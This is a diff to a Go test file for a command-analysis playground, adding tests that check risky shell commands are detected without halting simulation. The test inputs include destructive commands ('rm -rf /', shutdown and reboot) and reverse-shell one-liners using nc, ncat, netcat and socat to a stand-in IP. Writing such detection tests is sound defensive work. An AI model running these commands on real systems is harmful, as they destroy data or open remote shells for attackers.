@@ -6,6 +6,7 @@ import (
 	"testing"
 
 	"github.com/nullptrpanic/libcommand"
+	commandanalysis "github.com/nullptrpanic/libcommand/analysis"
 )
 
 func TestAnalyzeJSONRecordsObservedCommand(t *testing.T) {
@@ -171,6 +172,122 @@ func TestAnalyzeRecordsUnregisteredCommandAsUnresolved(t *testing.T) {
 	result := response.Invocations[0].Result
 	if result == nil || !result.Unresolved {
 		t.Fatalf("result = %#v, want unresolved", result)
+	}
+}
+
+func TestAnalyzeRecordsRiskWithoutStoppingSimulation(t *testing.T) {
+	response := analyze(&playgroundRequest{
+		Source: "rm -rf /; echo continued",
+	}, maximumTraceEvents)
+
+	if response.Error != "" {
+		t.Fatalf("response error = %q, want non-blocking detection", response.Error)
+	}
+	if len(response.Detections) != 1 {
+		t.Fatalf("detections = %#v, want one", response.Detections)
+	}
+	detection := response.Detections[0]
+	if detection.Command != "rm" || detection.NodeID == 0 || detection.PathID == 0 || detection.Sequence == 0 {
+		t.Fatalf("detection = %#v, want located rm risk", detection)
+	}
+	if !strings.Contains(detection.Error, "command risk detected") {
+		t.Fatalf("detection error = %q, want classified risk", detection.Error)
+	}
+	if len(response.Invocations) != 2 || response.Invocations[1].Invocation.Name != "echo" {
+		t.Fatalf("invocations = %#v, want execution to continue through echo", response.Invocations)
+	}
+}
+
+func TestAnalyzeAppliesDetectionMiddlewareToBuiltinCommands(t *testing.T) {
+	previous, existed := playgroundAnalysisCommands["echo"]
+	playgroundAnalysisCommands["echo"] = commandanalysis.RM
+	t.Cleanup(func() {
+		if existed {
+			playgroundAnalysisCommands["echo"] = previous
+			return
+		}
+		delete(playgroundAnalysisCommands, "echo")
+	})
+
+	response := analyze(&playgroundRequest{Source: "echo -rf /"}, maximumTraceEvents)
+	if response.Error != "" || len(response.Detections) != 1 {
+		t.Fatalf("response = %#v, want builtin invocation analyzed without changing its result", response)
+	}
+	if response.Detections[0].Command != "echo" {
+		t.Fatalf("detection = %#v, want echo", response.Detections[0])
+	}
+	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil || response.Invocations[0].Result.Stdout != "-rf /\n" {
+		t.Fatalf("invocations = %#v, want original echo result", response.Invocations)
+	}
+}
+
+func TestAnalyzeRegistersCommonRiskCommands(t *testing.T) {
+	tests := []*struct {
+		name    string
+		source  string
+		command string
+	}{
+		{name: "absolute rm", source: "/bin/rm -rf /", command: "/bin/rm"},
+		{name: "poweroff", source: "poweroff", command: "poweroff"},
+		{name: "reboot", source: "reboot", command: "reboot"},
+		{name: "halt", source: "halt", command: "halt"},
+		{name: "shutdown", source: "shutdown now", command: "shutdown"},
+		{name: "init", source: "init 0", command: "init"},
+		{name: "telinit", source: "telinit 6", command: "telinit"},
+		{name: "systemctl", source: "systemctl poweroff", command: "systemctl"},
+		{name: "nc", source: "nc -e /bin/sh 10.0.0.1 4444", command: "nc"},
+		{name: "ncat", source: "ncat --exec=/bin/sh 10.0.0.1 4444", command: "ncat"},
+		{name: "netcat", source: "netcat -c /bin/sh 10.0.0.1 4444", command: "netcat"},
+		{name: "socat", source: "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", command: "socat"},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			response := analyze(&playgroundRequest{Source: test.source}, maximumTraceEvents)
+			if response.Error != "" || len(response.Detections) != 1 {
+				t.Fatalf("response = %#v, want one non-blocking detection", response)
+			}
+			if got := response.Detections[0].Command; got != test.command {
+				t.Fatalf("detected command = %q, want %q", got, test.command)
+			}
+		})
+	}
+}
+
+func TestAnalyzeRunsDetectionBeforeConfiguredCommandAndKeepsItsResult(t *testing.T) {
+	response := analyze(&playgroundRequest{
+		Source: "rm -rf /",
+		Commands: []*playgroundCommand{{
+			Name:     "rm",
+			Stdout:   "configured output",
+			ExitCode: 7,
+		}},
+	}, maximumTraceEvents)
+
+	if response.Error != "" || len(response.Detections) != 1 {
+		t.Fatalf("response = %#v, want non-blocking detection", response)
+	}
+	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil {
+		t.Fatalf("invocations = %#v, want configured command result", response.Invocations)
+	}
+	result := response.Invocations[0].Result
+	if result.Stdout != "configured output" || result.ExitCode != 7 || result.Unresolved {
+		t.Fatalf("result = %#v, want configured handler to remain authoritative", result)
+	}
+}
+
+func TestAnalyzeRunsDetectionBeforeJavaScriptCommand(t *testing.T) {
+	source := `return { stdout: "javascript output", exitCode: 3 };`
+	response := analyze(&playgroundRequest{
+		Source:   "rm -rf /",
+		Commands: []*playgroundCommand{{Name: "rm", JavaScript: &source}},
+	}, maximumTraceEvents)
+
+	if len(response.Detections) != 1 {
+		t.Fatalf("detections = %#v, want risk before JavaScript handler", response.Detections)
+	}
+	if !strings.Contains(response.Error, "JavaScript command handlers require the browser Playground") {
+		t.Fatalf("response error = %q, want JavaScript adapter result instead of detection error", response.Error)
 	}
 }
 
